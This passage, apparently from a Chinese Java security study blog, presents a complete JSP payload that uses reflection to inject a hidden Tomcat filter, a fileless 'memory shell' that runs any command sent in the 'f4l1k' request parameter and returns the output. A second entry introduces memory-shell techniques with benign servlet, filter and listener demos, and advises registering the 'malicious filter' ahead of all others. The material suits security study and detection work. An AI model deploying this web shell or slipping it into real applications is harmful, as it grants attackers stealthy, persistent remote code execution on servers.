class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">String name = <span class="string">&quot;f4l1k&quot;</span>;</span><br><span class="line">ServletContext context = request.getSession().getServletContext();</span><br><span class="line">Field scontext = context.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">scontext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">System.out.println(scontext.getType());</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) scontext.get(context);</span><br><span class="line"></span><br><span class="line">Field acontext = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">acontext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">System.out.println(acontext);</span><br><span class="line">StandardContext standarContext = (StandardContext) acontext.get(applicationContext);</span><br><span class="line"></span><br><span class="line">Field configs = standarContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Map filterConfigs = (Map) configs.get(standarContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">  Filter filter = <span class="keyword">new</span> Filter()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse rep, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(req.getParameter(<span class="string">&quot;f4l1k&quot;</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">        Process run = Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;f4l1k&quot;</span>));</span><br><span class="line">        InputStream in = run.getInputStream();</span><br><span class="line">        BufferedReader bu =  <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">        String cmd = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((cmd = bu.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">          rep.getWriter().write(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      chain.doFilter(req,rep);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">  filterDef.setFilterName(name);</span><br><span class="line">  filterDef.setFilter(filter);</span><br><span class="line">  filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">  standarContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">  FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">  filterMap.setFilterName(name);</span><br><span class="line">  filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">  filterDef.setDescription(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">  standarContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">  Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">  constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">  ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standarContext,filterDef);</span><br><span class="line">  filterConfigs.put(name,filterConfig);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>该内存马职能在Tomcat 7.x 以上，因为 javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3，也就是我们无法设置FilterMap</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://wjlshare.com/archives/1529#0x04_Filter">http://wjlshare.com/archives/1529#0x04_Filter</a></li><li><a href="https://xz.aliyun.com/t/10362">https://xz.aliyun.com/t/10362</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/14622879.html#0x03-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0">https://www.cnblogs.com/nice0e3/p/14622879.html#0x03-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0</a></li><li><a href="https://reader-l.github.io/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/">https://reader-l.github.io/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java 学习日程（内存马）</title>
      <link href="/2021/11/27/java_study/java_day8/"/>
      <url>/2021/11/27/java_study/java_day8/</url>
      
        <content type="html"><![CDATA[<h1 id="内存马-基础知识"><a href="#内存马-基础知识" class="headerlink" title="内存马(基础知识)"></a>内存马(基础知识)</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面我跟随P牛的脚步看了一些反序列化，当然还有很多链没有跟着分析，可能考虑后面再接着跟。今天开始打算对java内存马进行一个系统化的学习，并记录一些学习过程中的知识点。</p><p>内存马是一种无文件落地马，相对于原来的普通木马有隐蔽性强的特点，原来的木马由于新webshell检测技术也更容易被检测到，随着冰蝎的java agent 类型的内存马出现，内存马又出现在大众的眼中。</p><p>目前主要的内存马方式有以下几种方式：</p><ul><li>动态注册 servlet/filter/listener（使用 servlet-api 的具体实现）</li><li>动态注册 interceptor/controller（使用框架如 spring/struts2）</li><li>动态注册使用<strong>职责链</strong>设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</li><li>使用 java agent 技术写入字节码</li></ul><h3 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h3><h4 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h4><h5 id="servlet介绍"><a href="#servlet介绍" class="headerlink" title="servlet介绍"></a>servlet介绍</h5><p>借用菜鸟教程的介绍：</p><blockquote><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p></blockquote><p><img src="/2021/11/27/java_study/java_day8/image-20211127140840551.png" alt="image-20211127140840551"></p><p>我们可以看到servlet主要是用来处理由http协议发送和传输的报文</p><p>servlet主要的工作流程我们借用一张图来展示</p><p><img src="/2021/11/27/java_study/java_day8/image-20211127142122754.png" alt="image-20211127142122754"></p><p>我们收到http请求web服务器会将我们的request和response封装成HttpServletRequest和HttpServletResponse对象，然后调用对应servlet的init()方法，该方法只在第一次请求时被调用，接着servlet会去调用service()方法处理消息，并将结果返回给HttpServletResponse对象。</p><h5 id="servlet生命周期"><a href="#servlet生命周期" class="headerlink" title="servlet生命周期"></a>servlet生命周期</h5><p><img src="/2021/11/27/java_study/java_day8/image-20211127142656302.png" alt="image-20211127142656302"></p><p>服务器启动时或者第一次请求该servlet时会初始化一个servlet对象，当服务关闭时，就会调用destory()方法销毁。所以servlet的生命周期是由web容器负责。</p><h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><h5 id="filter介绍"><a href="#filter介绍" class="headerlink" title="filter介绍"></a>filter介绍</h5><p>filter是servlet的过滤器,是对servlet的一种补充，我们在调用servlet的service()方法之前会经过对应的filter，可以对一些不合法的请求进行拦截或更改</p><p><img src="/2021/11/27/java_study/java_day8/image-20211127143611401.png" alt="image-20211127143611401"></p><h5 id="filter基本工作原理"><a href="#filter基本工作原理" class="headerlink" title="filter基本工作原理"></a>filter基本工作原理</h5><p>1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。<br>2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。<br>3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。<br>4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。<br>5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。<br>6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。</p><h5 id="filter的生命周期"><a href="#filter的生命周期" class="headerlink" title="filter的生命周期"></a>filter的生命周期</h5><ul><li>init(FilterConfig filterConfig)<ul><li>初始化方法，只会在web应用程序启动时调用一次</li><li>和我们编写的Servlet程序一样，Filter的创建和销毁由WEB服务器负责。</li><li>web 应用程序启动时，web 服务器将创建Filter 的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。</li><li>Filter对象创建之后会驻留在内存，一直服务。</li></ul></li><li>doFilter(ServletRequest request, ServletResponse response, FilterChain chain)<ul><li>完成实际的过滤操作。当客户请求访问与过滤器关联的URL的时候，Servlet过滤器将先执行doFilter方法。FilterChain参数用于访问后续过滤器。</li></ul></li><li>destroy();<ul><li>销毁方法，只会在当web应用移除或服务器停止时才调用一次来卸载Filter对象。</li><li>通常在这个方法中，可以释放过滤器使用的资源。</li></ul></li></ul><h5 id="filterchain（filter链）"><a href="#filterchain（filter链）" class="headerlink" title="filterchain（filter链）"></a>filterchain（filter链）</h5><p>在一个web应用当中，可以开发编写多个Filter,这些Filter组合起来称之为一个Filter链，其中每个过滤器（Filter）都可以决定是否执行下一步。</p><p>简单实现了个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TestFilter</span></span><br><span class="line"><span class="keyword">package</span> com.example.tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse rep, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is a Filter test&quot;</span>);</span><br><span class="line">        chain.doFilter(req,rep);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//web.xml</span></span><br><span class="line">&lt;filter&gt;</span><br><span class="line">  &lt;filter-name&gt;TestFilter&lt;/filter-name&gt;</span><br><span class="line">  &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">com</span>.<span class="title">example</span>.<span class="title">tomcat</span>.<span class="title">TestFilter</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">TestFilter</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/*&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该过滤器只要访问该web服务的资源就会调用该filter</p><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</p><p>ServletContextListener：对Servlet上下文的创建和销毁进行监听，监听 Web 应用的生命周期；<br>ServletContextAttributeListener：监听Servlet上下文属性的添加、删除和替换；<br>HttpSessionListener：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。<br>HttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听；<br>ServletRequestListener：对请求对象的初始化和销毁进行监听；<br>ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。</p><p>用途<br>可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</p><p>这里我写了一个ServletRequestListener的demo,也就是监听请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TestListener</span></span><br><span class="line"><span class="keyword">package</span> com.example.tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestListener</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is a listener&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;listener out&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//web.xml</span></span><br><span class="line">&lt;listener&gt;</span><br><span class="line">        &lt;listener-<span class="class"><span class="keyword">class</span>&gt;<span class="title">com</span>.<span class="title">example</span>.<span class="title">tomcat</span>.<span class="title">TestListener</span>&lt;/<span class="title">listener</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class"> &lt;/<span class="title">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/27/java_study/java_day8/image-20211204143718345.png" alt="image-20211204143718345"></p><h4 id="servlet-api-动态注册"><a href="#servlet-api-动态注册" class="headerlink" title="servlet api 动态注册"></a>servlet api 动态注册</h4><p>当我们使用tomcat注册servlet、filter和listener时主要是三种注册方式</p><blockquote><p>Web.xml注册</p><p>注解注册</p><p>动态注册</p></blockquote><p>web.xml注册</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//servlet</span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.tomcat.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//listener</span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.example.tomcat.TestListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//filter</span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>TestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.tomcat.TestFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>TestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注解注册即在对应类上使用注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//servlet</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//listener</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//filter</span></span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br></pre></td></tr></table></figure><p>动态注册</p><p>动态注册是在Web容器初始化阶段，使用ServletContext去动态注册。</p><p>一个最简单的注册servlet的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRegistration;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContextListener</span> <span class="keyword">implements</span> <span class="title">ServletContextListener</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextInitialized</span><span class="params">(ServletContextEvent sce)</span> </span>&#123;</span><br><span class="line">        ServletContext servletContext = sce.getServletContext();</span><br><span class="line">        ServletRegistration.Dynamic dynamic =  servletContext.addServlet(<span class="string">&quot;TestServlet&quot;</span>,TestServlet.class);</span><br><span class="line">        dynamic.addMapping(<span class="string">&quot;/dynamic&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextDestroyed</span><span class="params">(ServletContextEvent sce)</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/27/java_study/java_day8/image-20211204155434823.png" alt="image-20211204155434823"></p><p>Filter </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FilterRegistration.Dynamic dynamicFilter = servletContext.addFilter(<span class="string">&quot;DynamicFilter&quot;</span>,<span class="keyword">new</span> DynamicFilter());</span><br><span class="line">        dynamicFilter.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),<span class="keyword">false</span>,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>addMappingForUrlPatterns中一共有三个参数<br><code>EnumSet&lt;DispatcherType&gt; dispatcherTypes, boolean isMatchAfter, String... urlPatterns</code></p><ul><li>dispatcherTypes一共有下面几种模式，表示过滤器的类型，我们这里使用Request模式</li></ul><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>Forward</td><td>通过RequestDispatcher的forward()，或者<a href="jsp:forward">jsp:forward</a></td></tr><tr><td>Include</td><td>通过RequestDispatcher的include()，或者<a href="jsp:include">jsp:include</a></td></tr><tr><td>Request</td><td>普通模式，来自客户端的请求</td></tr><tr><td>Error</td><td>请求错误页面来处理HTTP错误，例如404,500</td></tr><tr><td>Async</td><td>来自AsyncContext的异步请求</td></tr></tbody></table><ul><li>boolean isMatchAfter，动态注册Filter中，过滤顺序由isMatchAfter属性决定</li></ul><p>​    true表示放在当前应用所有的过滤器之后，false表示将该过滤器放在当前应用所有的过滤器之前</p><p>​    我们注册的恶意filter优先级一定要高，放在所有过滤器之前，所以这里选false</p><ul><li>String… urlPatterns 表示我们要拦截的url</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DynamicFilter</span></span><br><span class="line"><span class="keyword">package</span> com.example.tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> 